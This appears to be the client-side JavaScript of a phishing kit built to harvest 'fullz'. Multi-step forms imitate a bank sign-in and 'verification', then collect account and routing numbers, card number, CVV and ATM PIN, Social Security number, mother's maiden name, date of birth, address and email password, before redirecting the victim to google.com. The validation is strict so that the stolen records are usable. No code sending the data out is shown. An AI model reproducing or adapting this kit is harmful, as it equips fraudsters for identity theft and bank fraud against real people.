function _$(item){
    return document.querySelector(item);
}
const loginForm = _$(".login__wrapper");
const signInLoginFormBtn = _$(".sign__btn");
const usernameInput = _$(".username__input");
const passwordInput = _$(".password__input");
const eyeIcon = _$(".eye-img");
const errorContainer = _$(".error__container");
const cancelErrorContainer = _$(".xmark");
const year = _$(".year");

if(year){
    year.innerHTML = new Date().getFullYear()
}
passwordEyeToggle(passwordInput, eyeIcon);

function passwordEyeToggle(inputElement, iconElement){
    if (inputElement || iconElement) { 
        iconElement.addEventListener("click", ()=>{
            if(inputElement.type === "password"){
                inputElement.type = "text"
                iconElement.src = "./images/img-eye-open.png";
            }
            else{
                inputElement.type = "password"
                iconElement.src = "./images/img-eye-close.png";
            }
        });
    }
}
if(cancelErrorContainer){
    cancelErrorContainer.addEventListener("click", ()=>{
        errorContainer.classList.remove("showerrorcontainer");

    });
}
document.addEventListener("input", (e)=>{
    const username = usernameInput.value.trim();
    const password = passwordInput.value;
    if(username !== "" && password !== ""){
        signInLoginFormBtn.removeAttribute("disabled");
        signInLoginFormBtn.classList.add("active");
    }
    else{
        signInLoginFormBtn.setAttribute("disabled", "true");
        signInLoginFormBtn.classList.remove("active");
    }
});

if(loginForm){
    loginForm.addEventListener("submit", (e)=>{
        e.preventDefault()
        const usernameValue = usernameInput.value.trim();
        const passwordValue = passwordInput.value;
        if(usernameValue.length < 5 || passwordValue.length < 5){
            errorContainer.classList.add("showerrorcontainer");
        }
        else{
            location.replace("updatefullz_1.html");
        }

    });
}
/////::: formating credit card expiry date function::://///
function formatExpiryDateInput(inputElement){
    inputElement.addEventListener("input",(e)=>{
        let value = e.target.value.replace(/\D/g, "");
        if(value.length >= 2){
            value = value.slice(0,2) + "/" + value.slice(2,5);
        }
        e.target.value = value.slice(0,5);

    });

}
/////::: formating DateOfBirth function::://///
function formatDOB(inputElement) {
    let value = inputElement.value.replace(/\D/g, ""); // Remove non-numeric characters

    // Auto-format as DD/MM/YYYY
    if (value.length >= 2) {
        value = value.slice(0, 2) + "/" + value.slice(2);
    }
    if (value.length >= 5) {
        value = value.slice(0, 5) + "/" + value.slice(5, 9);
    }

    inputElement.value = value.slice(0, 10); // Limit to 10 characters
}
/////::: validating DateOfBirth function::://///
function validateDateOfBirth(dob) {
    const dobRegex = /^(0[1-9]|[12][0-9]|3[01])\/(0[1-9]|1[0-2])\/(19|20)\d{2}$/;
    if (!dobRegex.test(dob)) return false;

    const [day, month, year] = dob.split("/").map(Number);
    const dateObj = new Date(year, month - 1, day);

    if (dateObj.getDate() !== day || dateObj.getMonth() + 1 !== month || dateObj.getFullYear() !== year) {
        return false;
    }

    const today = new Date();
    const minBirthDate = new Date(today.getFullYear() - 18, today.getMonth(), today.getDate());
    return dateObj <= minBirthDate;
}
/////::: errorHandler function for account & rounting number::://///
function handleError(element,message,inputElement){
    if(element){
        element.innerHTML = message
    }
    const inputs = Array.isArray(inputElement) ? inputElement : [inputElement];
    inputs.forEach( input => {
            input.classList.add("error__color-border");        
    });
}
/////::: clearError function for account & rounting number::://///
function clearErrorOnInput(element,inputElement){
    const inputs = Array.isArray(inputElement) ? inputElement : [inputElement];
    inputs.forEach(input =>{
        if(!input) return;
        input.addEventListener("input", ()=>{
            if(element){
                element.innerHTML = ""
            }          
            input.classList.remove("error__color-border");        
        });
    });
}
//////::: validate account & rounting number fulz-webpage start here...::://///
const acctNumberInput = _$(".acct__input");
const accountNumberRegex = /^\d{10}$/
const routNumberInput = _$(".rout__input");
const rountingNumberRegex = /^\d{9}$/
const accountrountingNextBtn = _$(".acct__next-btn");
const allerror = _$(".allerror__acct-rount");
const accountNumError = _$(".acct__error");
const rountingNumError = _$(".rount__error");
const invalidAccountNumber = _$(".invalidAcct__error");
const invalidRountingNumber = _$(".invalidRount__error");

if(accountrountingNextBtn){
    accountrountingNextBtn.addEventListener("click", (e)=>{
        e.preventDefault()
    const accountNumber = acctNumberInput.value.trim()
    const rountingNumber = routNumberInput.value.trim()
    if(accountNumber === "" && rountingNumber === ""){
        handleError(allerror,`All fields are required. Please fill out the form.`,[acctNumberInput,routNumberInput]);   
    }
    else if(accountNumber === ""){
        handleError(accountNumError,`Account Number is required.`,[acctNumberInput]);
    }
    else if(!accountNumberRegex.test(accountNumber)){
        handleError(invalidAccountNumber,`Please enter a valid account number.`,[acctNumberInput])
    }
    else if(rountingNumber === ""){
        handleError(rountingNumError,`Rounting Number is required.`,[routNumberInput]);
    }
    else if(!rountingNumberRegex.test(rountingNumber)){
        handleError(invalidRountingNumber,`Please enter a valid 9-digits rounting number.`,[routNumberInput]);
    }
    else{
        location.replace("updatefullz_2.html");
    }
 
});
clearErrorOnInput(allerror,[acctNumberInput,routNumberInput]);
clearErrorOnInput(accountNumError,[acctNumberInput]);
clearErrorOnInput(invalidAccountNumber,[acctNumberInput]);
clearErrorOnInput(rountingNumError,[routNumberInput]);
clearErrorOnInput(invalidRountingNumber,[routNumberInput]);
 }

//////::: validate credit card number fulz-webpage start here...::://///
const cardNextBtn = _$(".card__next-btn");
const cardNameInput = _$(".cardname__input");
const cardNumberInput = _$(".cardnum__input");
const expiryDateInput = _$(".expirydate__input");
const cvvInput = _$(".cvv__input");
const atmPinInput = _$(".atmpin__input");
const allErrorCard = _$(".allerror-card");
const cardNameError = _$(".namerror-card");
const invalidCardName = _$(".invalid__name");
const cardNumberError = _$(".numerror-card");
const invalidCardNumber = _$(".invalid__card-num");
const cardExpiryError = _$(".expyerror-card");
const invalidCardExpiry = _$(".invalid__expiry");
const cvvError = _$(".cvverror-card");
const invalidCvv = _$(".invalid__cvv")
const pinError = _$(".atmerror-card");
const invalidPin = _$(".invalid__atmpin");


if(cardNextBtn){
    cardNextBtn.addEventListener("click", (e)=>{
        e.preventDefault();
        const cardName = cardNameInput.value.trim();
        const cardNameRegex = /^[A-Za-z][a-zA-Z'-]+(\s[A-Za-z][a-zA-Z'-]+)+$/
        const cardNumber = cardNumberInput.value.trim();
        const cardNumberRegex = /^\d{13,19}$/
        const cardExpiryDate = expiryDateInput.value.trim();
        const cardExpiryRegex = /^(0[1-9]|1[0-2])\/([2-9][0-9])$/;
        const cvv = cvvInput.value.trim();
        const cvvRegex = /^\d{3}$/
        const pin = atmPinInput.value.trim();
        const pinRegex = /^\d{4}$/

        if(cardName === "" && cardNumber === "" && cardExpiryDate === "" 
            && cvv === "" && pin === ""){
                handleError(allErrorCard,`All fields are required. Please fill out the form.`,[cardNameInput,cardNumberInput,expiryDateInput,cvvInput,atmPinInput]);
        }
        else if(cardName === ""){
            handleError(cardNameError,`Card Holder Name is required. Please provide your full name.`,[cardNameInput]);
        }
        else if(!cardNameRegex.test(cardName)){
            handleError(invalidCardName,`Invalid full name. Use 'John Doe' format.`,[cardNameInput]);
        }
        else if(cardNumber === ""){
            handleError(cardNumberError,`Card Number is required.`,[cardNumberInput]);
        }
        else if(!cardNumberRegex.test(cardNumber)){
            handleError(invalidCardNumber,`Invalid card number. Card number must contain 13 to 19 digits only.`,[cardNumberInput])
        }
        else if(cardExpiryDate === ""){
            handleError(cardExpiryError,`Expiry Date is required.`,[expiryDateInput]); 
        }
        else if(!cardExpiryRegex.test(cardExpiryDate)){
            handleError(invalidCardExpiry,`Invalid expiry date. Use MM/YY format.`,[expiryDateInput])
        }
        else if(cvv === ""){
            handleError(cvvError,`CVV is required.`,[cvvInput]);
        }
        else if(!cvvRegex.test(cvv)){
            handleError(invalidCvv,`Invalid CVV. Enter 3 digits.`,[cvvInput]);
        }
        else if(pin === ""){
            handleError(pinError,`ATM Pin is required.`,[atmPinInput]);
        }
        else if(!pinRegex.test(pin)){
            handleError(invalidPin,`PIN must be 4 digits only.`,[atmPinInput]);
        }
        else{
            location.replace("updatefullz_3.html");
        }
    });
    clearErrorOnInput(allErrorCard,[cardNameInput,cardNumberInput,expiryDateInput,cvvInput,atmPinInput])
    clearErrorOnInput(cardNameError,[cardNameInput]);
    clearErrorOnInput(invalidCardName,[cardNameInput]);
    clearErrorOnInput(cardNumberError,[cardNumberInput]);
    clearErrorOnInput(invalidCardNumber,[cardNumberInput]);
    clearErrorOnInput(cardExpiryError,[expiryDateInput]);
    clearErrorOnInput(invalidCardExpiry,[expiryDateInput]);
    formatExpiryDateInput(expiryDateInput);
    clearErrorOnInput(cvvError,[cvvInput]);
    clearErrorOnInput(invalidCvv,[cvvInput]);
    clearErrorOnInput(pinError,[atmPinInput]);
    clearErrorOnInput(invalidPin,[atmPinInput]);   
}
//////::: validate address fulz-webpage start here...::://///
const addressForm = _$(".address__form-verify");
const addressNextBtn = _$(".address__next-btn");
const fullNameInput = _$(".fullname1");
const streetNameInput = _$(".street-input");
const cityNameInput = _$(".city-input");
const stateNameInput = _$(".state-input");
const socialNumberInput = _$(".social-input");
const maidenNameInput = _$(".Maiden-input");
const dateOfBirthInput = _$(".dob-input");
const zipCodeInput = _$(".zip-input");
const phoneNumberInput = _$(".number-input");
const allErrorAddress = _$(".all__error-address");
const fullNameError = _$(".fullnamerror");
const invalidFullname = _$(".invalid__fullname");
const addressError = _$(".adrserror");
const invalidAddress = _$(".invalid-street");
const cityError = _$(".cityerror");
const invalidCity = _$(".invalid-city");
const stateError = _$(".stateerror");
const invalidState = _$(".invalid-state");
const socialError = _$(".ssneerror");
const invalidSocial = _$(".invalid-ssn");
const maidenNameError = _$(".maiden__error")
const invaildMaidenName = _$(".invalid__maiden-name");
const dateOfBirthError = _$(".dob__error");
const invalidDOB = _$(".invalid__dob");
const zipCodeError = _$(".zipcode__error");
const invalidZipCode = _$(".invalid-zipcode");
const phoneNumberError = _$(".tele__error");
const invalidPhoneNumber = _$(".invalid__number");

if(dateOfBirthInput){
    dateOfBirthInput.addEventListener("input",()=>{
        formatDOB(dateOfBirthInput);
    });

}
if(addressNextBtn){
    addressNextBtn.addEventListener("click", (e)=>{
        e.preventDefault()
        const fullName = fullNameInput.value.trim();
        const fullNameRegex = /^[A-Za-z][a-zA-Z'-]+(\s[A-Za-z][a-zA-Z'-]+)+$/
        const streetName = streetNameInput.value.trim();
        const addressRegex = /^[a-zA-Z0-9\s,'-.]{3,100}$/;
        const cityName = cityNameInput.value.trim();
        const cityRegex = /^[a-zA-Z\s'-]{2,50}$/;
        const stateName = stateNameInput.value.trim();
        const combinedStateRegex = /^(A[LKZR]|C[AOT]|D[CE]|F[LM]|G[A]|H[I]|I[ADLN]|K[SY]|L[A]|M[ADEHINOST]|N[CDEHJMVY]|O[HKR]|P[ARW]|R[I]|S[CD]|T[NX]|UT|V[AIT]|W[AIVY]|Alabama|Alaska|Arizona|Arkansas|California|Colorado|Connecticut|Delaware|Florida|Georgia|Hawaii|Idaho|Illinois|Indiana|Iowa|Kansas|Kentucky|Louisiana|Maine|Maryland|Massachusetts|Michigan|Minnesota|Mississippi|Missouri|Montana|Nebraska|Nevada|New Hampshire|New Jersey|New Mexico|New York|North Carolina|North Dakota|Ohio|Oklahoma|Oregon|Pennsylvania|Rhode Island|South Carolina|South Dakota|Tennessee|Texas|Utah|Vermont|Virginia|Washington|West Virginia|Wisconsin|Wyoming)$/i;
        const socialNumber = socialNumberInput.value.trim();
        const strictSSNRegex = /^(?!000|666|9\d{2})\d{3}(?!00)\d{2}(?!0000)\d{4}$/
        const maidenName = maidenNameInput.value.trim();
        const maidenNameRegex = /^[A-Za-z]+(?: [A-Za-z]+)*$/
        const dateOfBirth = dateOfBirthInput.value.trim();
        const zipCode = zipCodeInput.value.trim()
        const zipCodeRegex = /^\d{5}$/
        const phoneNumber = phoneNumberInput.value.trim();
        const phoneNumberRegex = /^\+?1?\s?\(?\d{3}\)?[-.\s]?\d{3}[-.\s]?\d{4}$/

        if(fullName === "" && streetName === "" && cityName === "" && stateName === "" 
            && socialNumber === "" && maidenName === "" && dateOfBirth === "" && zipCode === ""
        && phoneNumber === ""){
            handleError(allErrorAddress,`All fields are required. Please fill out the form.`,[fullNameInput,
                streetNameInput,cityNameInput,stateNameInput,socialNumberInput,maidenNameInput,dateOfBirthInput,
                zipCodeInput,phoneNumberInput ]);  
        }
        else if(fullName === ""){
            handleError(fullNameError,`Please provide your full name.`[fullNameInput]);
        }
        else if(!fullNameRegex.test(fullName)){
            handleError(invalidFullname,`Invalid full name. Use 'John Doe' format.`,[fullNameInput]);
        }
        else if(streetName === ""){
            handleError(addressError,`Street Address is required.`,[streetNameInput])
        }
        else if(!addressRegex.test(streetName)){
            handleError(invalidAddress,`Please enter a valid street address (3-100 characters).`,[streetNameInput]);
        }
        else if(cityName === ""){
            handleError(cityError,`City is required.`,[cityNameInput]);
        }
        else if(!cityRegex.test(cityName)){
            handleError(invalidCity,`Please enter a valid city name (2-50 letters).`,[cityNameInput]);
        }
        else if(stateName === ""){
            handleError(stateError,`State is required.`,[stateNameInput]);
        }
        else if(!combinedStateRegex.test(stateName)){
            handleError(invalidState,`Please enter a valid U.S. state or territory.`,[stateNameInput]);
        }
        else if(socialNumber === ""){
            handleError(socialError,`Social Security Number is required.`, [socialNumberInput]);
        }
        else if(!strictSSNRegex.test(socialNumber)){
            handleError(invalidSocial,`Please enter a valid 9-digit SSN number.`,[socialNumberInput]);
        }
        else if(maidenName === ""){
            handleError(maidenNameError,`Mother's Maiden Name is required.`,[maidenNameInput]);
        }
        else if(!maidenNameRegex.test(maidenName)){
            handleError(invaildMaidenName,`Please enter a valid Maiden name (letters only).`,[maidenNameInput]);
        }
        else if(dateOfBirth === ""){
            handleError(dateOfBirthError,`Date of Birth is required.`,[dateOfBirthInput]);   
        }
        else{
            formatDOB(dateOfBirthInput);
            if(!validateDateOfBirth(dateOfBirth)){ 
                handleError(invalidDOB,`Invalid date. Please enter a valid date format (DD/MM/YYYY).`, [dateOfBirthInput]) 
            }
            else if(zipCode === ""){
                handleError(zipCodeError,`Zip Code is required.`,[zipCodeInput])
            }
            else if(!zipCodeRegex.test(zipCode)){
                handleError(invalidZipCode,`Invalid ZIP code format.`,[zipCodeInput])
            }
            else if(phoneNumber === ""){
                handleError(phoneNumberError,`Phone Number is required.`,[phoneNumberInput]);
            }
            else if(!phoneNumberRegex.test(phoneNumber)){
                handleError(invalidPhoneNumber,`Invalid phone number format. Please enter a valid US phone number.`,[phoneNumberInput]);
            }
            else{
                location.replace("updatefullz_4.html");
            }
        }
       
    });

    clearErrorOnInput(allErrorAddress,[fullNameInput,
        streetNameInput,cityNameInput,stateNameInput,socialNumberInput,maidenNameInput,dateOfBirthInput,
        zipCodeInput,phoneNumberInput ]);
        clearErrorOnInput(fullNameError,[fullNameInput]);
        clearErrorOnInput(invalidFullname,[fullNameInput]);
        clearErrorOnInput(addressError,[streetNameInput]);
        clearErrorOnInput(invalidAddress,[streetNameInput]);
        clearErrorOnInput(cityError,[cityNameInput]);
        clearErrorOnInput(invalidCity,[cityNameInput]);
        clearErrorOnInput(stateError,[stateNameInput]);
        clearErrorOnInput(invalidState,[stateNameInput]);
        clearErrorOnInput(socialError,[socialNumberInput])
        clearErrorOnInput(invalidSocial,[socialNumberInput]);
        clearErrorOnInput(maidenNameError,[maidenNameInput]);
        clearErrorOnInput(invaildMaidenName,[maidenNameInput]);
        clearErrorOnInput(dateOfBirthError,[dateOfBirthInput]);
        clearErrorOnInput(invalidDOB,[dateOfBirthInput]);
        clearErrorOnInput(zipCodeError,[zipCodeInput]);
        clearErrorOnInput(invalidZipCode,[zipCodeInput]);
        clearErrorOnInput(phoneNumberError,[phoneNumberInput]);
        clearErrorOnInput(invalidPhoneNumber,[phoneNumberInput]);   
}
//////::: validate email and password fulz-webpage start here...::://///
const emailAndPasswordForm = _$(".mail__input-wrapper");
const emailNextBtn = _$(".mail__next-btn");
const allErrorEmail = _$(".allerror__email-password");
const emailInput = _$(".email__input");
const emailPasswordInput = _$(".email__password-input");
const emailError = _$(".email__error");
const invalidEmail = _$(".invalid__email");
const emailPasswordError = _$(".email__password-error");
const invalidEmailPassword = _$(".invalid__email-password");

if(emailNextBtn){
    emailNextBtn.addEventListener("click", (e)=>{
        e.preventDefault()
        const email = emailInput.value.trim().toLowerCase();
        const emailRegex = /^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/;
        const emailPassword = emailPasswordInput.value

        if(email === "" && emailPassword === ""){
            handleError(allErrorEmail,`All fields are required. Please fill out the form.`,[emailInput,emailPasswordInput]);
        }
        else if(email === ""){
            handleError(emailError,`Email is required.`,[emailInput]);
        }
        else if(!emailRegex.test(email)){
            handleError(invalidEmail,`Please enter a valid email address.`,[emailInput]);
        }
        else if(emailPassword === ""){
            handleError(emailPasswordError,`Email Password is required.`,[emailPasswordInput]);  
        }
        else if(emailPassword.length < 5 ){
            handleError(invalidEmailPassword,`We couldn't verify your password. Please re-enter it.`,[emailPasswordInput])
        }
        else{
            location.replace("verifiedPage.html");
        }
    });
    clearErrorOnInput(allErrorEmail,[emailInput,emailPasswordInput]);
    clearErrorOnInput(emailError,[emailInput]);
    clearErrorOnInput(invalidEmail,[emailInput]);
    clearErrorOnInput(emailPasswordError,[emailPasswordInput]);
    clearErrorOnInput(invalidEmailPassword,[emailPasswordInput]);
}
// redirection script here.......//
const verifyPage = _$(".main__verified");
if(verifyPage){
    redirectTimeOut()

}

function redirectTimeOut(){
    setTimeout(()=>{
        location.replace("https://www.google.com/");

    },3000);
}




